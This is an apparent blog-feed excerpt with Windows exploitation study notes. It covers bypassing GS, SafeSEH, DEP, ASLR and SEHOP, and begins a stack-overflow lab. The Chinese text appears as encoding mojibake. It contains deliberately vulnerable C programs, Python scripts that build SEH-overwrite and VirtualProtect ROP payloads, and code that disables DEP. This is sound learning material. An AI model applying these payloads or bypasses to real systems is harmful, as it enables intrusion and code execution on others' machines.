    <content type="html"><![CDATA[<p>é’ˆå¯¹æ ˆæ”»å‡»çš„é˜²æŠ¤ä¸ç»•è¿‡</p><span id="more"></span><h1 id="gs"><a class="markdownIt-Anchor" href="#gs"></a> GS</h1><p>GSæœ¬è´¨ä¸Šå’ŒLinux GCCä¸­çš„canaryå¾ˆç›¸ä¼¼ï¼Œä»–åœ¨æ ˆå¸§çš„ç»“å°¾ï¼ˆEBPä¹‹å‰ï¼‰æ’å…¥ä¸€ç»™<code>DWORD</code>ç±»å‹çš„å€¼ï¼Œå…¶å‰¯æœ¬å­˜åœ¨äº<code>.data</code>ä¸­ã€‚</p><p><img src="https://img.joe1sn.top/uploads/big/b3c288e6425290fda519c82da1cad2d8.png" alt="image-20230712223606947" /></p><p>åœ¨ç¼–è¯‘çš„æ—¶å€™å¹¶ä¸ä¼šå­˜åœ¨GSä¿æŠ¤æœ‰ä¸‹é¢å‡ ç§æƒ…å†µ</p><ul><li>å‡½æ•°ä¸åŒ…å«ç¼“å†²åŒº</li><li>å‡½æ•°è¢«å®šä¹‰ä¸ºå…·æœ‰å˜é‡å‚æ•°åˆ—è¡¨</li><li>å‡½æ•°ä½¿ç”¨æ— ä¿æŠ¤çš„å…³é”®å­—æ ‡è®°</li><li>å‡½æ•°åœ¨ç¬¬ä¸€ä¸ªè¯­å¥ä¸­åŒ…å«å†…åµŒæ±‡ç¼–ä»£ç </li><li>ç¼“å†²åŒºä¸æ˜¯ 8 å­—èŠ‚ç±»å‹ä¸”å¤§å°ä¸å¤§äº 4 ä¸ªå­—èŠ‚</li></ul><p>ä¸è¿‡ä»ç„¶å¯ä»¥é‡‡ç”¨<code>#pragma strict_gs_check </code>å¼ºåˆ¶å¯ç”¨GSä¿æŠ¤</p><p><img src="https://img.joe1sn.top/uploads/big/750aa691ce894524469f1b01cd77e309.png" alt="image-20230712230456568" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vulfuction</span><span class="params">(<span class="type">char</span>* str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arry[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(arry, str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* str = <span class="string">&quot;yeah,i have GS protection&quot;</span>;</span><br><span class="line">vulfuction(str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/51469c6f21d21998618b65975dac846d.png" alt="image-20230712231538824" /></p><p><img src="https://img.joe1sn.top/uploads/big/374afa04add92f9d9522083ab2cb45ac.png" alt="image-20230712231847170" /></p><p>ç»•è¿‡æ–¹å¼è¦æ¼æ´ç±»å‹çµæ´»é€‰æ‹©</p><ul><li><p>å¦‚æœæ˜¯å¯ä»¥æ³„éœ²é‚£ä¹ˆæ³„éœ²åæ‹¼æ¥å†æº¢å‡º</p></li><li><p>å†C++ä¸­ï¼Œ<code>struct</code>å’Œ<code>class</code>é™¤äº†è®¿é—®æƒé™æ²¡æœ‰ä¸åŒï¼Œé‚£ä¹ˆæœ‰æœºä¼šå¯ä»¥é€šè¿‡ä¿®æ”¹å‡½æ•°æŒ‡é’ˆï¼ˆæ¯”å¦‚è™šå‡½æ•°ï¼‰æ¥è¿›è¡ŒRCE</p></li><li><p>å¦‚æœå­˜åœ¨ä»»æ„åœ°å€å†™æˆ–è€…èƒ½è¿‡å†™é“<code>.data</code>æ®µï¼ˆæ¯”å¦‚å­˜åœ¨å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´ï¼‰ï¼Œå¯ä»¥å°†å¯¹æ¯”çš„cookieè®¾ç½®ä¸ºç‰¹å®šå€¼</p><p><img src="https://img.joe1sn.top/uploads/big/2b71e1f69270fdfb33074a2c981321bc.png" alt="image-20230713081622450" /></p><p><img src="https://img.joe1sn.top/uploads/big/acce2fb38f039e66a5257f69f0ee9336.png" alt="image-20230713082958542" /></p></li><li><p>GSæœºåˆ¶æ²¡æœ‰å­˜åœ¨SEHçš„ä¿æŠ¤ï¼Œæ‰€ä»¥ <strong>ã€Win Pwnã€‘åŸºç¡€æ ˆæº¢å‡ºåˆ©ç”¨</strong> ä¸­çš„åˆ©ç”¨æ‰‹æ®µä»ç„¶èƒ½å¤ŸæˆåŠŸï¼Œåªæ˜¯æº¢å‡ºé•¿åº¦å’ŒROPçš„Gadgetéœ€è¦é‡æ–°è®¾ç½®ã€‚</p><p><img src="https://img.joe1sn.top/uploads/big/1e013c016c634b7c9b510528f57f7f11.png" alt="image-20230713000747391" /></p><p><img src="https://img.joe1sn.top/uploads/big/db77970446f88fc23cfb89501cc7f235.png" alt="image-20230713000801579" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x160</span>-<span class="built_in">len</span>(shellcode)-<span class="number">16</span>) <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\x9e\x26\x41\x00&quot;</span>    <span class="comment">#0041269E</span></span><br><span class="line"></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x2c\x07\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">                                                        <span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x64c;//sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">16</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2a8a0b38238c8d4b55c053daf8d7f822.png" alt="image-20230713081020816" /></p></li></ul><h1 id="safeseh"><a class="markdownIt-Anchor" href="#safeseh"></a> SafeSEH</h1><p>0dayé‚£æœ¬ä¹¦ä¸Šä¿¡æ¯æœ‰ç‚¹â€¦è¿‡æ—¶äº†ï¼Œè¿™é‡Œå¯ä»¥å‚è€ƒå¾®è½¯çš„å®˜æ–¹å®šä¹‰<a href="https://learn.microsoft.com/zh-cn/cpp/build/reference/safeseh-image-has-safe-exception-handlers?view=msvc-170"><code>/SAFESEH</code>ï¼ˆæ˜ åƒå…·æœ‰å®‰å…¨å¼‚å¸¸å¤„ç†ç¨‹åºï¼‰</a>ï¼Œä¸»è¦è¯†åˆ«æ–¹æ³•å°±æ˜¯åœ¨<code>.rdata</code>ä¸­å­˜åœ¨<code>IMAGE_LOAD_CONFIG_DIRECTORY32_2</code></p><p><img src="https://img.joe1sn.top/uploads/big/79a4334e1d29d557df4e66527b98c69a.png" alt="image-20230713090918752" /></p><p>é€šè¿‡<code>RtlDispatchException</code>å‡½æ•°å®ç°</p><p><img src="https://img.joe1sn.top/uploads/big/dae06c1a5f9088ea1eed84fbfbbfca68.png" alt="image-20230713091103788" /></p><p>æ¯”è¾ƒé€šæ€çš„æ–¹æ³•å°±æ˜¯</p><ul><li>ä¸ä½¿ç”¨SEH</li><li>åœ¨å †åŒºä¸Šå¸ƒç½®shellcodeç„¶åæ‰§è¡Œ</li></ul><p>è¿™é‡Œæ”¹åŠ¨ä¸€ä¸‹æºä»£ç </p><ol><li><p>æŠŠSEHçš„åœ°å€æ‰‹åŠ¨æ”¹ä¸ºå †åœ°å€</p><p><img src="https://img.joe1sn.top/uploads/big/e8047ce0aa682162a04e464d06cb447e.png" alt="image-20230713093246026" /></p></li><li><p>ç»è¿‡æ ¡éªŒåç›´æ¥åˆ°å †ä¸­æ‰§è¡Œäº†</p><p><img src="https://img.joe1sn.top/uploads/big/23640b0c2f51bb770ee04be0cd63bf20.png" alt="image-20230713093529382" /></p><p><img src="https://img.joe1sn.top/uploads/big/5b3318808a12b59116c30bef0ff5c1ac.png" alt="image-20230713093751706" /></p><p>P3æ˜¯é‡å¯äº†ä¸€æ¬¡åæˆªå›¾ï¼Œåœ°å€å¯èƒ½ä¼šä¸ä¸€æ ·</p></li></ol><p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯åœ°å€çš„ROPå¿…é¡»ç¬¦åˆéªŒè¯çš„æƒé™ï¼Œä½†æ˜¯<strong>æ²¡æœ‰å¼€å¯SafeSEHçš„DLLæ–‡ä»¶ä¸­çš„Gadget</strong>ã€æ²¡æœ‰<strong>DEPæ—¶å€™çš„å †åœ°å€</strong>éƒ½å¯ä»¥ä½¿ç”¨ã€‚</p><h1 id="dep"><a class="markdownIt-Anchor" href="#dep"></a> DEP</h1><p>DEPæ˜¯ç±»ä¼¼äºWindowsä¸Šçš„NXï¼Œä½œç”¨æ˜¯ç¦æ­¢å †æ ˆçš„æ•°æ®æ‹¥æœ‰æ‰§è¡Œçš„æƒé™ï¼Œé¿å…äº†Shellcodeç›´æ¥æ‰§è¡Œã€‚</p><p>æ“ä½œç³»ç»Ÿé€šè¿‡è®¾ç½®å†…å­˜é¡µçš„ NX/XD å±æ€§æ ‡è®°ï¼Œæ¥æŒ‡æ˜ä¸èƒ½ä»è¯¥å†…å­˜æ‰§è¡Œä»£ç ã€‚ä¸ºäº†å®ç° è¿™ä¸ªåŠŸèƒ½ï¼Œéœ€è¦åœ¨å†…å­˜çš„é¡µé¢è¡¨ï¼ˆPage T ableï¼‰ä¸­åŠ å…¥ä¸€ä¸ªç‰¹æ®Šçš„æ ‡è¯†ä½ï¼ˆNX/XDï¼‰æ¥æ ‡è¯†æ˜¯ å¦å…è®¸åœ¨è¯¥é¡µä¸Šæ‰§è¡ŒæŒ‡ä»¤ã€‚å½“è¯¥æ ‡è¯†ä½è®¾ç½®ä¸º 0 é‡Œè¡¨ç¤ºè¿™ä¸ªé¡µé¢å…è®¸æ‰§è¡ŒæŒ‡ä»¤ï¼Œè®¾ç½®ä¸º 1 æ—¶è¡¨ ç¤ºè¯¥é¡µé¢ä¸å…è®¸æ‰§è¡ŒæŒ‡ä»¤ã€‚</p><p>å…³äºNXä¿æŠ¤ä¹Ÿå¯ä»¥æ‰‹åŠ¨æŸ¥çœ‹</p><p><img src="https://img.joe1sn.top/uploads/big/e91415d0cafe28798ab17cbdfff475bb.png" alt="image-20230713095059334" /></p><p>åªç¼–è¯‘DEPå¯èƒ½è¿˜éœ€è¦å…³é—­è¿è¡Œæ—¶æ£€æŸ¥</p><p><img src="https://img.joe1sn.top/uploads/big/2ace5c957abc3787e65922ccf1a7e343.png" alt="image-20230713133201425" /></p><p>ä¸»è¦æ€è·¯å°±æ˜¯Ret2Libc</p><ul><li><p>è°ƒç”¨<code>ZwSetInformationProcess</code>å…³é—­DEP</p><p>åœ¨ä¹‹å‰çš„ã€Šã€winå†…æ ¸åŸç†ä¸å®ç°ã€‘II. è¿›ç¨‹ä¸çº¿ç¨‹ã€‹ä¸­æåˆ°è¿‡<code>_KPROCESS</code>å­˜åœ¨<code>ExecuteOptions</code></p><p><img src="https://img.joe1sn.top/uploads/big/b4d51d5aa29ea68f1f9a32053f3e6b20.png" alt="image-20230713100758503" /></p><p>æˆ‘å¹¶æ²¡æœ‰åœ¨å¾®è½¯çš„å®˜ç½‘ä¸Šæ‰¾åˆ°è¯¥ç»“æ„ä½“çš„è¯´æ˜ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä¹‹å‰ä»–ä»¬çš„é€†å‘ç»“æœæ‰¾åˆ°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Pos0 ExecuteDisable        :<span class="number">1b</span>it </span><br><span class="line">Pos1 ExecuteEnable         :<span class="number">1b</span>it </span><br><span class="line">Pos2 DisableThunkEmulation :<span class="number">1b</span>it </span><br><span class="line">Pos3 Permanent             :<span class="number">1b</span>it </span><br><span class="line">Pos4 ExecuteDispatchEnable :<span class="number">1b</span>it </span><br><span class="line">Pos5 ImageDispatchEnable   :<span class="number">1b</span>it </span><br><span class="line">Pos6 Spare                 :<span class="number">2b</span>it</span><br></pre></td></tr></table></figure><p>å½“å‰è¿›ç¨‹ DEP å¼€å¯æ—¶ ExecuteDisable ä½è¢«ç½® 1ï¼Œå½“ è¿›ç¨‹ DEP å…³é—­æ—¶ ExecuteEnable ä½è¢«ç½® 1ï¼ŒDisableThunkEmulation æ˜¯ä¸ºäº†å…¼å®¹ ATL ç¨‹åºè®¾ç½®çš„ï¼Œ Permanent è¢«ç½® 1 åè¡¨ç¤ºè¿™äº›æ ‡å¿—éƒ½ä¸èƒ½å†è¢«ä¿®æ”¹ã€‚çœŸæ­£å½±å“ DEP çŠ¶æ€æ˜¯å‰ä¸¤ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬åª è¦å°†_KEXECUTE_OPTIONS çš„å€¼è®¾ç½®ä¸º 0x02ï¼ˆäºŒè¿›åˆ¶ä¸º 00000010ï¼‰å°±å¯ä»¥å°† ExecuteEnable ç½®ä¸º 1ã€‚</p><p>ä½¿ç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE; </span><br><span class="line">ZwSetInformationProcess( </span><br><span class="line"> NtCurrentProcess(),    <span class="comment">// (HANDLE)-1 </span></span><br><span class="line"> ProcessExecuteFlags,   <span class="comment">// 0x22 </span></span><br><span class="line"> &amp;ExecuteFlags,         <span class="comment">// ptr to 0x2 </span></span><br><span class="line"> <span class="keyword">sizeof</span>(ExecuteFlags)); <span class="comment">// 0x4 </span></span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥å…³æ‰DEPä¿æŠ¤äº†ï¼Œåœ¨0dayä¹¦ä¸­ä»‹ç»äº†3ç§ç›´æ¥åˆ©ç”¨å…¼å®¹æ€§å¼‚å¸¸è€Œå¯¼è‡´DEPå…³é—­çš„æ–¹æ³•</p><blockquote><p>ï¼ˆ1ï¼‰å½“ DLL å— SafeDisc ç‰ˆæƒä¿æŠ¤ç³»ç»Ÿä¿æŠ¤æ—¶ï¼›</p><p>ï¼ˆ2ï¼‰å½“ DLL åŒ…å«æœ‰.aspcakã€.pcleã€.sforce ç­‰å­—èŠ‚æ—¶ï¼›</p><p>ï¼ˆ3ï¼‰Windows V ista ä¸‹é¢å½“ DLL åŒ…å«åœ¨æ³¨å†Œè¡¨â€œHKEY_LOCAL_MACHINE\SOFTWARE  \Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptionsâ€é”®ä¸‹è¾¹æ ‡è¯† å‡ºä¸éœ€è¦å¯åŠ¨ DEP çš„æ¨¡å—æ—¶</p></blockquote><p>å¾ˆå¯æƒœåœ¨windows10ä¸­è¿™äº›æƒ…å†µå‡ ä¹ä¸ä¼šå‡ºç°ï¼Œæ‰€ä»¥æ–¹æ³•ä¸é€‚ç”¨</p></li></ul><p>è¿™ä¸¤ç§æ˜¯æˆ‘æ¯”è¾ƒå–œæ¬¢ç”¨çš„ï¼Œå› ä¸ºå¯ä»¥å’Œå…æ€ç»“åˆåœ¨ä¸€èµ·</p><p>ä»–ä»¬çš„åŸºç¡€å°±æ˜¯ç±»ä¼¼LinuxPwnä¸­çš„ROPæ„é€ ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯32ä¸‹ï¼Œcdcleè°ƒç”¨æ–¹å¼ï¼Œä½¿ç”¨æ ˆä¼ å‚</p><ul><li><p><code>VirtualProtect</code>æ”¹å†™å†…å­˜æƒé™</p><p>å…³äºå‡½æ•°çš„ç”¨æ³•ï¼š<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">virtualProtect å‡½æ•° (memoryapi.h)</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualProtect</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  LPVOID lpAddress,</span></span><br><span class="line"><span class="params">  [in]  SIZE_T dwSize,</span></span><br><span class="line"><span class="params">  [in]  DWORD  flNewProtect,</span></span><br><span class="line"><span class="params">  [out] PDWORD lpflOldProtect</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>lpAddress</code>:  è¦æ”¹å˜å±æ€§çš„å†…å­˜èµ·å§‹åœ°å€ã€‚</p><p><code>dwSize</code>:  è¦æ”¹å˜å±æ€§çš„å†…å­˜åŒºåŸŸå¤§å°ã€‚</p><p><code>flNewProtect</code>:  å†…å­˜æ–°çš„å±æ€§ç±»å‹ï¼Œè®¾ç½®ä¸º PAGE_EXECUTE_READWRITEï¼ˆ0x40ï¼‰æ—¶è¯¥ å†…å­˜é¡µä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œã€‚</p><p><code>pflOldProtect</code>:  å†…å­˜åŸå§‹å±æ€§ç±»å‹ä¿å­˜åœ°å€ã€‚ ä¿®æ”¹å†…å­˜å±æ€§æˆåŠŸæ—¶å‡½æ•°è¿”å›é 0ï¼Œä¿®æ”¹å¤±è´¥æ—¶è¿”å› 0ã€‚</p><p>ä¸è¿‡APIä½äºçš„æ˜¯<code>shell32.dll</code>å½“ä¸­ï¼Œæ‰€ä»¥è¦æ·»åŠ ä¸Š<code>HINSTANCE hInst = LoadLibrary(L&quot;shell32.dll&quot;);</code></p><p>ç”±äºROPä¾èµ–äºå‡½æ•°è°ƒç”¨çš„ä¼ å‚æ–¹å¼ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç»å…¸çš„ä¼ å‚</p><p><img src="https://img.joe1sn.top/uploads/big/ed81eaf5da5e42ca1bfb625c694f5216.png" alt="image-20230713193232979" /></p><p>ROPæ—¶æ ˆçš„ç»“æ„</p><p><img src="https://img.joe1sn.top/uploads/big/54294658ba1a5556fff36100908b0736.png" alt="image-20230713193507826" /></p><p>ç”±äºæ²¡æœ‰æ³„éœ²ç‚¹ï¼Œæ‰€ä»¥åªèƒ½åœ¨è°ƒè¯•çš„æ—¶å€™ä¿®æ”¹ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨Gadgetæ¥æ„é€ ï¼Œæ¯”å¦‚è¯´é€šè¿‡<code>ESP</code>ç›¸å…³å¾—åˆ°æ ˆåœ°å€ä¹‹ç±»çš„ã€‚ï¼ˆä½†æ˜¯å¾—åˆ°<code>VirtualProtect</code>å°±å¤ªå›°éš¾äº†ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*<span class="number">0x14</span></span><br><span class="line">payload = offset </span><br><span class="line">payload += <span class="string">b&quot;\x90&quot;</span>*<span class="number">4</span>    <span class="comment">#VirtualProtect</span></span><br><span class="line">payload += <span class="string">b&quot;\x80&quot;</span>*<span class="number">4</span>    <span class="comment">#Shellcode Address</span></span><br><span class="line">payload += <span class="string">b&quot;\x80&quot;</span>*<span class="number">4</span>    <span class="comment">#Shellcode Address</span></span><br><span class="line">payload += <span class="string">b&quot;\xff\x00\x00\x00&quot;</span>  <span class="comment">#Address Length</span></span><br><span class="line">payload += <span class="string">b&quot;\x40\x00\x00\x00&quot;</span>  <span class="comment">#PAGE_EXECUTE_READWRITE</span></span><br><span class="line">payload += <span class="string">b&quot;\x38\xa0\x41\x00&quot;</span>  <span class="comment">#0041A038</span></span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a68c0c2af42ae0d17c84c82d9d2db5b0.png" alt="image-20230713195003967" /></p></li><li><p><code>VirtualAlloc</code>æ¥å¼€è¾Ÿå¯æ‰§è¡Œçš„å†…å­˜ç„¶åæ‰§è¡Œshellcode</p><p>å’Œ<code>VirtualProtect</code>ä¸€æ ·çš„é“ç†ï¼Œä¸è¿‡éœ€è¦ä½¿ç”¨å¤åˆ¶çš„payloadå°†shellcodeå¤åˆ¶åˆ°å¯æ‰§è¡Œçš„å†…å­˜ä¸­</p></li></ul><h1 id="aslr"><a class="markdownIt-Anchor" href="#aslr"></a> ASLR</h1><p>åœ¨ç»•è¿‡DEPä¿æŠ¤ä¸­éœ€è¦è°ƒè¯•çš„æ—¶å€™æ‰èƒ½å†™å…¥å‡½æ•°åœ°å€çš„åŸå› å°±æ˜¯è¿™äº›å‡½æ•°çš„DLLä½¿ç”¨äº†ASLRä¿æŠ¤ï¼Œå¯¼è‡´å‡½æ•°æ¯æ¬¡åŠ è½½çš„åŸºåœ°å€ä¸åŒï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨å›ºå®šåœ°å€ã€‚</p><p>ç»•è¿‡æ€è·¯ä¸»è¦æœ‰</p><ul><li>ä½ä½è¦†ç›–ï¼Œæœ€ä½ä½æ˜¯å›ºå®šçš„</li><li>å †å–·ï¼Œå°†å†…å­˜åˆå§‹åŒ–åçš„<code>\x0c</code>å¼ºåˆ¶å†™ä¸º<code>\x90</code>ï¼ˆ<code>nop</code>çš„æ±‡ç¼–ï¼‰ï¼Œè¿™æ ·ç¨‹åºè¿›å…¥äº†ä»»æ„çš„åœ°å€éƒ½èƒ½æ»‘è¡Œåˆ°shellcodeã€‚ï¼ˆæ‰©å¤§ä¼¤å®³é¢ï¼‰</li></ul><h1 id="sehop"><a class="markdownIt-Anchor" href="#sehop"></a> SEHOP</h1><p>ç”±äºSEHæ˜¯é“¾å¼çš„ï¼Œæ‰€ä»¥ä»–ä¼šé¡ºç€é“¾è¡¨æ£€æŸ¥ï¼Œå¦‚æœæœ€åä¸€ä¸ªä¸ä¸ºç³»ç»Ÿå›ºå®šçš„ç»ˆæå¼‚å¸¸å¤„ç†å‡½æ•°å°±ç›´æ¥ä¸æ‰§è¡Œã€‚</p><p><img src="https://img.joe1sn.top/uploads/big/5319fbefe0a46939d4d853e4debc9e4f.png" alt="image-20230713201332561" /></p><p>æœ€ç›´æ¥æœ‰æ•ˆçš„å°±æ˜¯ä¼ªé€ SEHé“¾ï¼Œç”±äºåªä¼šéªŒè¯æœ€åä¸€ä¸ªï¼Œåªæ»¡è¶³è¿™ä¸ªæ¡ä»¶å°±å¯ä»¥äº†</p><p>ç”±äºSEHOPåœ¨SafeSEHä¹‹å‰ï¼Œæ‰€ä»¥ç»•è¿‡è¿‡åè¿˜éœ€è¦ç»§ç»­ç»•è¿‡SafeSEH</p><p><img src="https://img.joe1sn.top/uploads/big/f99910e357fc63d939677ac967101038.png" alt="image-20230713201648035" /></p><h1 id="å‚è€ƒ"><a class="markdownIt-Anchor" href="#å‚è€ƒ"></a> å‚è€ƒ</h1><p>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;é’ˆå¯¹æ ˆæ”»å‡»çš„é˜²æŠ¤ä¸ç»•è¿‡&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ã€Win Pwnã€‘åŸºç¡€æ ˆæº¢å‡ºåˆ©ç”¨</title>
    <link href="https://joe1sn.eu.org/2023/07/08/win-pwn-stack/"/>
    <id>https://joe1sn.eu.org/2023/07/08/win-pwn-stack/</id>
    <published>2023-07-08T08:39:36.000Z</published>
    <updated>2023-07-08T10:18:47.929Z</updated>
    
    <content type="html"><![CDATA[<p>[Win Pwn] åŸºç¡€æ ˆæº¢å‡ºåˆ©ç”¨</p><p>windowä¸‹æ— ä¿æŠ¤çš„æ ˆæº¢å‡ºåŠ è½½shellcode</p><span id="more"></span><h1 id="ç¨‹åº"><a class="markdownIt-Anchor" href="#ç¨‹åº"></a> ç¨‹åº</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">vuln();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨windowsä¸‹çš„é˜²æŠ¤ç­‰çº§æœ‰</p><ul><li><code>ASLR</code><ul><li><code>/DYNAMICBASE</code> å¸¦æœ‰å‰¥ç¦»çš„é‡å®šä½æ¡ç›®è¾¹ç¼˜æƒ…å†µ</li><li><code>/HIGHENTROPYVA</code> for 64-bit systems</li></ul></li><li><code>Code 